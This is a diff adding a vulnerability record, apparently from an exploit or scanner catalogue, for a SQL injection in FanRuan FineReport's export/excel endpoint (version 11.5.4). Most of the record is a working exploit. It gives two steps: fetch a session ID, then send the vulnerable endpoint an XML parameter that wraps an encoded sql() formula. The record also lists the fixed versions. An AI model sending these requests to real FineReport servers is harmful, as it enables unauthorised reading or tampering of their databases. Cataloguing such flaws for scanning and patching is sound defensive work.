@@ -1,0 +1,13 @@
+vendor = "帆软"
+name = "帆软 FineReport export/excel 接口 SQL 注入漏洞"
+type = "SQL注入"
+path = "/webroot/decision/nx/report/v9/largedataset/export/excel"
+version = "11.5.4"
+detail = """GET /webroot/decision/view/report?op=getSessionID HTTP/1.1 Host: target
+GET /webroot/decision/nx/report/v9/largedataset/export/excel HTTP/1.1 Host: target sessionID: <sid>
+params: <R><Parameters><Parameter><Attributes name="p1"></Attributes><Object t="Formula"><Attributes>sql('FRDemo', DECODE('%2573%2565...'), 1, 1)</Attributes></Object></Parameter></Parameters></R>"""
+fix = "升级至 11.5.4.1+ / 7.0.5+"
+date = 20251020
+label = "nday"
+cve = "QVD-2025-48729"
+verifier = "AdySec"
